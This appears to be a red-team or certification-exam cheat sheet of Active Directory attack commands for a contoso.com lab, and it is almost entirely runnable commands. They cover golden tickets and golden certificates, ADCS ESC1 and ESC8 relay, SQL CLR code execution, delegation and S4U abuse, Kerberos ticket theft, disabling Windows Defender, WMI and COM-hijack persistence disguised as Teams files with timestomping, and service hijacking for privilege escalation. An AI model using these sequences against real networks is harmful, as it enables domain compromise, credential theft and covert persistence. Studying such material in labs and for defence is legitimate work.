ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid

dcsync dublin.contoso.com DUBLIN\krbtgt

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden

kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN TICKET].kirbi
run klist

ls \\\\lon-dc-1\\c$
```

>DPERSIST1 for Domain Persistence Golden Certificates, admin persistence
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet

[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-cs-1.pfx", [Convert]::FromBase64String("[CERT]"))

C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\lon-cs-1.pfx --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:[FORGED CERT] /enctype:aes256 /nowrap
```

>ADCS ESC8
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet

socks 1080 socks5
netstat

sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
sc_stop lanmanserver
sc_stop srv2
sc_stop srvnet

netstat
rportfwd_local 445 localhost 7445
netstat

powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445

docker container start -i kali-1
nano /etc/proxychains.conf

socks5 10.0.0.5 1080

proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108

socks stop
rportfwd stop 445
sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
sc_start srvnet
sc_start srv2
sc_start lanmanserver

powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
```

ADCS ESC1
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
```

SQL Servers
```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName

sql-info lon-db-1
sql-whoami lon-db-1

ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member

sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"

sql-enableclr lon-db-1

C:\Payloads\smb_x64.xthread.bin

sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure

link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
// EXAM2: link dub-sql-1 dotnet-diagnost-6845-ceeb-b00b-63676827406

sql-disableclr lon-db-1

sql-links lon-db-1

sql-whoami lon-db-1 "" lon-db-2
sql-checkrpc lon-db-1

sql-enablerpc lon-db-1 lon-db-2

sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2

sql-disablerpc lon-db-1 lon-db-2
whoami

C:\Payloads\tcp-local_x64.exe

cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
upload C:\Payloads\tcp-local_x64.exe

execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
connect localhost 1337
```

>RBCD
```
socks 1080 socks5

Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"

Set-MpPreference -DisableRealtimeMonitoring $true

krb_tgtdeleg
runas /netonly /user:CONTOSO\pchilds powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt

ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt

Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount

$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'

Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\

Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'
Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
```

>S4U2Self
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1

krb_s4u /ticket:[TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
```

>Service Name Substitution
```
krb_s4u /ticket:[TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
```

>Constrained Delegation
```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

[Convert]::ToBoolean(16781312 -band 16777216)

krb_dump /luid:3e7 /service:krbtgt
krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
```

>Unconstrained Delegation
```
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName

krb_triage

ldapsearch samAccountName=dyork --attributes memberOf

krb_dump /user:dyork /service:krbtgt
```

>Lateral Movement
```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe`
jump scshell64 xxx-xxxxx-2 smb
```

>User Impersonation
```
ls \\\\lon-ws-1\\c$

krb_triage
krb_dump /user:rsteel /service:krbtgt

[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))

make_token CONTOSO\rsteel FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

run klist
ls \\\\lon-ws-1\\c$
rev2self
```

>Elevated Persistence
```
C:\Tools\WmiPersistence.ps1

C:\Payloads\dns_x64.exe

upload C:\Payloads\dns_x64.exe
mv dns_x64.exe windbg.exe

powershell-import C:\Tools\WmiPersistence.ps1
psinject [BEACON PID] x64 Add-WmiPersistence
execute gpupdate /target:computer /force
psinject [BEACON PID] x64 Remove-WmiPersistence
```

>Privilege Escalation
```
spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe

powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}

ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

C:\Payloads\http_x64.svc.exe
sc_stop BadWindowsService

cd C:\Temp
upload C:\Payloads\http_x64.svc.exe

sc_qc BadWindowsService
sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
sc_start BadWindowsService

sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
rm http_x64.svc.exe
sc_start BadWindowsService
```

>Persistence
```
C:\Payloads\http_x64.dll

cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64

upload C:\Payloads\http_x64.dll

mv http_x64.dll Microsoft.Teams.HttpClient.dll
timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll

reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
```

